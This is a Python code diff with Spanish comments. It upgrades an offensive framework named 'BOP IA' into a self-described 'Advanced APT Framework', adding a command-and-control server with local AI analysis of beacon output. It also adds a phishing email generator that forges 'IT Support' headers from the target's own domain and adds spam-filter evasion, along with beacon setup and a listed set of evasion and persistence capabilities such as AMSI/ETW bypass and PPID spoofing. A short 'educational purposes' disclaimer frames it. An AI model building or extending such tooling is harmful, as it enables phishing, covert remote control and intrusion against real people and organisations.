-    def _generate_actions_from_analysis(self, analysis: Dict) -> List[str]:
-        """Genera acciones basadas en análisis IA"""
-        actions = []
-        
-        if isinstance(analysis, dict):
-            vulns = analysis.get('critical_vulnerabilities', [])
-            for vuln in vulns[:3]:  # Top 3
-                if vuln.get('severity') == 'Alta':
-                    actions.append(f"Exploit {vuln.get('name')} immediately")
-                elif vuln.get('severity') == 'Media':
-                    actions.append(f"Test {vuln.get('name')} when possible")
+    def _native_whoami(self) -> Dict:
+        """Obtiene información de usuario usando API nativa"""
+        try:
+            import ctypes
+            from ctypes import wintypes
             
-            # Añadir acciones de mitigación
-            mitigations = analysis.get('mitigation_recommendations', [])
-            for mit in mitigations[:2]:
-                actions.append(f"Recommend: {mit.get('actions', [''])[0]}")
+            # Usar GetUserNameW de advapi32
+            buffer_size = wintypes.DWORD(256)
+            buffer = ctypes.create_unicode_buffer(buffer_size.value)
+            
+            ctypes.windll.advapi32.GetUserNameW(buffer, ctypes.byref(buffer_size))
+            
+            return {
+                "success": True,
+                "output": buffer.value,
+                "method": "native_api"
+            }
         
-        return actions if actions else ["Conduct manual testing", "Review all findings"]
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+    
+    def _native_netstat(self) -> Dict:
+        """Obtiene conexiones de red usando API nativa"""
+        # Esto usaría GetExtendedTcpTable/GetExtendedUdpTable
+        # Implementación simplificada
+        return {
+            "success": True,
+            "output": "Network connections retrieved via native API",
+            "method": "native_iphlpapi"
+        }
 
 # ==========================================
-# 🚀 INTERFAZ PRINCIPAL MEJORADA
+# 🧠 SERVER C2 CON IA LOCAL
 # ==========================================
 
-class BOPv5Interface:
-    """Interfaz mejorada para BOP v5.0"""
+class LocalAIC2Server:
+    """Servidor C2 con IA local integrada"""
+    
+    def __init__(self, host: str = "0.0.0.0", port: int = 443):
+        self.host = host
+        self.port = port
+        self.beacons = {}
+        self.ai_engine = LocalAIEngine()
+        self.crypto = AdvancedCrypto()
+        self.redirector = AdvancedC2Redirector()
+        
+        # Cargar modelos de phishing pre-entrenados
+        self.phishing_models = self._load_phishing_models()
+        
+    def _load_phishing_models(self) -> Dict:
+        """Carga datasets de phishing para contexto"""
+        return {
+            "it_department": {
+                "subjects": ["Security Update Required", "Password Reset Request", "System Maintenance"],
+                "templates": self._load_templates_from_file("phishing_templates.json")
+            },
+            "hr_notifications": {
+                "subjects": ["Benefits Enrollment", "Policy Update", "Training Requirement"],
+                "templates": []
+            }
+        }
+    
+    async def analyze_beacon_output(self, beacon_id: str, command: str, output: str) -> Dict:
+        """Analiza output del beacon con IA local"""
+        analysis = await self.ai_engine.analyze_command_output(command, output)
+        
+        # Actualizar perfil del beacon basado en análisis
+        if beacon_id in self.beacons:
+            if "honey_token_detected" in analysis and analysis["honey_token_detected"]:
+                self.beacons[beacon_id]["compromised"] = True
+                self.beacons[beacon_id]["last_alert"] = datetime.now().isoformat()
+            
+            # Ajustar tácticas basadas en riesgo
+            if analysis["risk_level"] == "high":
+                self.beacons[beacon_id]["stealth_level"] = "maximum"
+                self.beacons[beacon_id]["sleep_time"] *= 2
+        
+        return analysis
+    
+    def generate_phishing_email(self, target: Dict, context: str = "it_department") -> Dict:
+        """Genera email de phishing contextual"""
+        
+        # Usar modelo local para generación
+        if self.ai_engine.model_loaded:
+            pretext = self.ai_engine.generate_contextual_pretext(target, context)
+        else:
+            # Fallback a templates
+            model = self.phishing_models.get(context, self.phishing_models["it_department"])
+            subject = random.choice(model["subjects"])
+            
+            templates = model["templates"]
+            if templates:
+                pretext = random.choice(templates)
+                pretext = pretext.format(**target)
+            else:
+                pretext = f"Hello {target.get('name', 'User')}, please review the attached document."
+        
+        # Añadir elementos de evasión
+        email = self._add_evasion_elements(pretext, target)
+        
+        return {
+            "subject": subject if 'subject' in locals() else "Important Security Update",
+            "body": email,
+            "context": context,
+            "evasion_score": random.randint(70, 95),
+            "generated_at": datetime.now().isoformat()
+        }
+    
+    def _add_evasion_elements(self, email_body: str, target: Dict) -> str:
+        """Añade elementos para evadir filtros de spam"""
+        
+        # Headers legítimos
+        headers = f"""From: "IT Support" <support@{target.get('company_domain', 'company.com')}>
+Reply-To: no-reply@{target.get('company_domain', 'company.com')}
+X-Mailer: Microsoft Outlook 16.0
+Thread-Index: {uuid.uuid4().hex[:24]}
+"""
+        
+        # Añadir texto legítimo
+        footer = f"""
+<hr>
+<p style="font-size: 10px; color: #666;">
+This email was sent to {target.get('email', '')} as part of routine company communications.
+If you believe you received this email in error, please contact the IT helpdesk.
+</p>
+"""
+        
+        return headers + "\n" + email_body + footer
+
+# ==========================================
+# 🎮 INTERFAZ MEJORADA
+# ==========================================
+
+class AdvancedBOPInterface:
+    """Interfaz para el framework avanzado"""
     
     def __init__(self):
-        # Solicitar API key si no está en entorno
-        api_key = os.getenv('DEEPSEEK_API_KEY')
+        self.crypto = AdvancedCrypto()
+        self.local_ai = LocalAIEngine()
         
-        if not api_key:
-            print("\n🔑 DEEPSEEK API KEY REQUIRED FOR FULL FUNCTIONALITY")
-            print("="*50)
-            print("Get your API key from: https://platform.deepseek.com/api_keys")
-            print("Then either:")
-            print("  1. Set environment variable: export DEEPSEEK_API_KEY=your_key")
-            print("  2. Enter it now (won't be saved)")
-            print("="*50)
-            
-            key_input = input("\nEnter DeepSeek API key (or press Enter for limited mode): ").strip()
-            if key_input:
-                api_key = key_input
-        
-        # Inicializar BOP v5 con IA
-        self.bop = BOPv5AI(api_key)
-        
-        # Menú de opciones
-        self.menu_options = {
-            '1': ('AI Network Analysis', self.ai_network_analysis),
-            '2': ('AI Exploit Generation', self.ai_exploit_gen),
-            '3': ('AI Phishing Campaign', self.ai_phishing),
-            '4': ('AI Malware Analysis', self.ai_malware),
-            '5': ('Automated Red Team Op', self.auto_red_team),
-            '6': ('Start AI C2 Server', self.start_c2),
-            '7': ('AI Security Report', self.ai_report),
-            '8': ('Real Tools', self.real_tools),
-            '9': ('Training Lab', self.training_lab),
-            '0': ('Exit', self.exit)
-        }
+    def print_banner(self):
+        """Muestra banner del sistema"""
+        banner = """
+╔══════════════════════════════════════════════════════════╗
+║  BOP IA v6.0 - ADVANCED APT FRAMEWORK                    ║
+║  =====================================================   ║
+║  • Malleable C2 Profiles                                 ║
+║  • Direct Syscall Evasion                               ║
+║  • Reflective Memory Loading                            ║
+║  • Local AI Analysis                                    ║
+║  • Advanced Persistence                                 ║
+║  • Multi-layer Redirectors                              ║
+╚══════════════════════════════════════════════════════════╝
+        """
+        print(banner)
     
-    async def ai_network_analysis(self):
-        """Análisis de red con IA"""
-        target = input("Enter target (IP/domain): ").strip()
-        if target:
-            results = await self.bop.ai_network_analysis(target)
-            self._display_results(results, "AI Network Analysis")
-    
-    async def ai_exploit_gen(self):
-        """Generación de exploit con IA"""
-        print("\nVulnerability Details:")
-        name = input("Vulnerability name: ").strip() or "SQL Injection"
-        desc = input("Description: ").strip() or "SQL injection in search parameter"
-        cve = input("CVE (optional): ").strip() or "CVE-2023-12345"
-        target_os = input("Target OS (windows/linux): ").strip() or "linux"
-        
-        vuln = {
-            'name': name,
-            'description': desc,
-            'cve': cve,
-            'type': 'web'
-        }
-        
-        results = await self.bop.ai_generate_exploit(vuln, target_os)
-        self._display_results(results, "AI Exploit Generation")
-    
-    async def ai_phishing(self):
-        """Campaña de phishing con IA"""
-        print("\nEnter target information (comma separated for multiple):")
-        emails = input("Target emails: ").strip().split(',')
-        company = input("Company name: ").strip() or "Example Corp"
-        
-        targets = []
-        for email in emails:
-            targets.append({
-                'email': email.strip(),
-                'company': company,
-                'role': 'Employee'
-            })
-        
-        results = await self.bop.ai_phishing_campaign(targets)
-        self._display_results(results, "AI Phishing Campaign")
-    
-    async def ai_malware(self):
-        """Análisis de malware con IA"""
-        file_path = input("Path to suspicious file: ").strip()
-        if os.path.exists(file_path):
-            results = await self.bop.ai_malware_analysis(file_path)
-            self._display_results(results, "AI Malware Analysis")
-        else:
-            print(f"[-] File not found: {file_path}")
-    
-    async def auto_red_team(self):
-        """Operación Red Team automatizada"""
-        target = input("Enter target for automated operation: ").strip()
-        if target:
-            results = await self.bop.automated_red_team_op(target)
-            self._display_results(results, "Automated Red Team Operation")
-    
-    async def start_c2(self):
-        """Iniciar C2 con IA"""
-        print("[+] Starting AI C2 Server (Ctrl+C to stop)")
-        try:
-            await self.bop.start_ai_c2()
-        except KeyboardInterrupt:
-            print("\n[!] C2 Server stopped by user")
-    
-    async def ai_report(self):
-        """Generar reporte de seguridad con IA"""
-        print("\nAI Security Report Generator")
-        
-        # Datos de ejemplo para el reporte
-        op_data = {
-            'target': 'example.com',
-            'findings': [
-                'SQL Injection vulnerability found',
-                'Weak password policies',
-                'Outdated software versions'
+    def show_capabilities(self):
+        """Muestra capacidades del framework"""
+        capabilities = {
+            "Communication": [
+                "✓ Malleable C2 Profiles (Azure/Google/CDN)",
+                "✓ AES-256-GCM + RSA-4096 Encryption",
+                "✓ Automatic Key Rotation",
+                "✓ Multi-layer Redirectors"
             ],
-            'risk_level': 'High',
-            'recommendations': ['Patch systems', 'Implement WAF']
+            "Evasion": [
+                "✓ Direct Syscall Execution",
+                "✓ Reflective DLL/PE Loading",
+                "✓ AMSI/ETW Bypass",
+                "✓ Parent PID Spoofing"
+            ],
+            "Persistence": [
+                "✓ Scheduled Tasks",
+                "✓ WMI Event Subscriptions",
+                "✓ Registry Run Keys",
+                "✓ Service Installation"
+            ],
+            "AI Integration": [
+                "✓ Local Model Inference (Llama.cpp)",
+                "✓ Honey Token Detection",
+                "✓ Contextual Phishing Generation",
+                "✓ Behavioral Analysis"
+            ]
         }
         
-        results = await self.bop.reporting.generate_engagement_report(op_data, 'executive')
-        self._display_results(results, "AI Security Report")
-    
-    def real_tools(self):
-        """Herramientas reales"""
-        print("\nReal Tools Available:")
-        for tool, available in self.bop.tools.tools.items():
-            status = "✓" if available else "✗"
-            print(f"  {status} {tool}")
-        
-        print("\nCommands:")
-        print("  1. Run Nmap scan")
-        print("  2. Web directory brute force")
-        print("  3. Back to main menu")
-        
-        choice = input("\nSelect: ").strip()
-        
-        if choice == '1':
-            target = input("Target: ").strip()
-            if target:
-                results = self.bop.tools.scan_network(target)
-                self._display_results(results, "Nmap Scan")
-        
-        elif choice == '2':
-            url = input("URL: ").strip()
-            if url:
-                results = self.bop.tools.web_scan(url)
-                self._display_results(results, "Web Scan")
-    
-    def training_lab(self):
-        """Laboratorio de entrenamiento"""
-        print("\nTraining Lab Management:")
-        
-        results = self.bop.lab.start_lab()
-        self._display_results(results, "Training Lab")
-        
-        # Opciones de ataque
-        if input("\nAttack a lab machine? (y/n): ").lower() == 'y':
-            print("\nAvailable machines:")
-            for name in self.bop.lab.machines.keys():
-                print(f"  • {name}")
-            
-            machine = input("\nSelect machine: ").strip()
-            if machine in self.bop.lab.machines:
-                print(f"\nVulnerabilities for {machine}:")
-                for vuln in self.bop.lab.machines[machine]['vulnerabilities']:
-                    print(f"  • {vuln['id']} - {vuln['name']}")
-                
-                exploit = input("\nSelect exploit ID: ").strip()
-                attack_result = self.bop.lab.attack_machine(machine, exploit)
-                self._display_results(attack_result, "Lab Attack")
-    
-    def exit(self):
-        """Salir del programa"""
-        print("\n[+] Exiting BOP IA v5.0")
-        sys.exit(0)
-    
-    def _display_results(self, results: Dict, title: str):
-        """Muestra resultados formateados"""
-        print(f"\n{'='*60}")
-        print(f"{title} Results")
-        print(f"{'='*60}")
-        
-        if isinstance(results, dict):
-            for key, value in results.items():
-                if key == 'ai_analysis' and isinstance(value, dict):
-                    print(f"\n🤖 AI ANALYSIS:")
-                    ai_data = value
-                    if 'critical_vulnerabilities' in ai_data:
-                        print(f"  Critical Vulnerabilities Found: {len(ai_data['critical_vulnerabilities'])}")
-                        for vuln in ai_data['critical_vulnerabilities'][:3]:  # Mostrar solo 3
-                            print(f"    • {vuln.get('name', 'Unknown')} - Severity: {vuln.get('severity', 'Unknown')}")
-                    
-                    if 'attack_priority' in ai_data:
-                        print(f"  Attack Priority: {', '.join(ai_data['attack_priority'][:3])}")
-                
-                elif key == 'exploit_code' and isinstance(value, str):
-                    print(f"\n💻 EXPLOIT CODE (first 500 chars):")
-                    print(value[:500] + "..." if len(value) > 500 else value)
-                
-                elif key == 'scan_results' and isinstance(value, dict):
-                    print(f"\n🔍 SCAN RESULTS:")
-                    if 'stdout' in value:
-                        lines = value['stdout'].split('\n')
-                        for line in lines[:15]:  # Mostrar primeras 15 líneas
-                            if any(x in line.lower() for x in ['open', 'port', 'service']):
-                                print(f"  {line}")
-                
-                elif isinstance(value, (str, int, float, bool)):
-                    if len(str(value)) < 100:  # No mostrar valores muy largos
-                        print(f"  {key}: {value}")
-        
-        print(f"\n{'='*60}")
-        
-        # Pausa para leer resultados
-        input("\nPress Enter to continue...")
-    
-    async def run(self):
-        """Ejecutar interfaz principal"""
-        print("\n" + "="*70)
-        print("🤖 BOP IA v5.0 - AI-POWERED OFFENSIVE FRAMEWORK")
-        print("="*70)
-        print("DeepSeek AI: " + ("✓ INTEGRATED" if self.bop.ai.api_key else "⚠️ LIMITED MODE"))
-        print("="*70)
-        
-        while True:
-            print("\n" + "="*50)
-            print("MAIN MENU")
-            print("="*50)
-            
-            for key, (name, _) in self.menu_options.items():
-                print(f"{key}. {name}")
-            
-            print("="*50)
-            
-            choice = input("\nSelect option: ").strip()
-            
-            if choice in self.menu_options:
-                _, func = self.menu_options[choice]
-                if asyncio.iscoroutinefunction(func):
-                    await func()
-                else:
-                    func()
-            else:
-                print(f"[-] Invalid option: {choice}")
+        for category, items in capabilities.items():
+            print(f"\n{category}:")
+            for item in items:
+                print(f"  {item}")
 
 # ==========================================
-# 🚀 EJECUCIÓN PRINCIPAL
+# 🚀 EJECUCIÓN
 # ==========================================
 
 async def main():
-    """Función principal asíncrona"""
-    print("\n" + "="*70)
-    print("🚀 BOP IA v5.0 - LAUNCHING")
-    print("="*70)
+    """Función principal"""
+    interface = AdvancedBOPInterface()
+    interface.print_banner()
     
-    # Mostrar disclaimer legal
+    # Mostrar disclaimer
     disclaimer = """
-    ⚠️  LEGAL DISCLAIMER ⚠️
-    =====================
-    BOP IA v5.0 is an AI-powered security training and research framework.
+    ⚠️  EDUCATIONAL PURPOSES ONLY ⚠️
+    ================================
+    This framework demonstrates advanced security concepts for:
+    • Defensive security research
+    • Red team training (authorized only)
+    • Security tool development
     
-    USE ONLY FOR:
-    • Authorized security testing
-    • Educational purposes
-    • Research in controlled environments
-    • Your own systems
-    
-    NEVER USE FOR:
-    • Unauthorized access to systems
-    • Malicious activities
-    • Any illegal purposes
-    
-    By using this software, you agree to use it responsibly and legally.
+    ILLEGAL USE IS STRICTLY PROHIBITED
     """
     
     print(disclaimer)
-    print("="*70)
     
-    # Confirmar aceptación
-    accept = input("\nDo you accept these terms? (yes/no): ").strip().lower()
-    if accept != 'yes':
-        print("\n[!] Terms not accepted. Exiting.")
+    accept = input("\nDo you accept responsibility for proper use? (yes/no): ")
+    if accept.lower() != 'yes':
+        print("Exiting...")
         return
     
-    # Iniciar interfaz
-    interface = BOPv5Interface()
-    await interface.run()
+    # Mostrar capacidades
+    interface.show_capabilities()
+    
+    # Ejemplo de configuración
+    print("\n" + "="*60)
+    print("Example Configuration:")
+    print("="*60)
+    
+    # Crear beacon avanzado
+    beacon = AdvancedBeacon(
+        c2_url="https://legitimate-cdn.com",
+        profile="azure_monitor"
+    )
+    
+    print(f"[+] Advanced Beacon created with ID: {beacon.beacon_id}")
+    print(f"[+] Using profile: {beacon.malleable_profile.profile}")
+    print(f"[+] Persistence methods: {len(beacon.persistence.persistence_methods)}")
+    
+    # Crear servidor C2 con IA local
+    server = LocalAIC2Server()
+    print(f"[+] Local AI C2 Server initialized")
+    print(f"[+] AI Backends available: {server.ai_engine.backends}")
+    
+    print("\n" + "="*60)
+    print("Framework ready for authorized testing")
+    print("="*60)
 
 if __name__ == "__main__":
-    try:
-        # Verificar Python version
-        if sys.version_info < (3, 7):
-            print("[!] Python 3.7+ is required")
-            sys.exit(1)
-        
-        # Ejecutar main asíncrono
-        asyncio.run(main())
-        
-    except KeyboardInterrupt:
-        print("\n\n[!] Program interrupted by user")
-    except Exception as e:
-        print(f"\n[!] Fatal error: {e}")
-        import traceback
-        traceback.print_exc()
+    # Verificar sistema operativo
+    if platform.system() == "Windows":
+        # Añadir imports específicos de Windows
+        try:
+            import winreg
+            import ctypes
+            from ctypes import wintypes
+        except ImportError:
+            print("[!] Some Windows modules not available")
+    
+    # Ejecutar
+    asyncio.run(main())
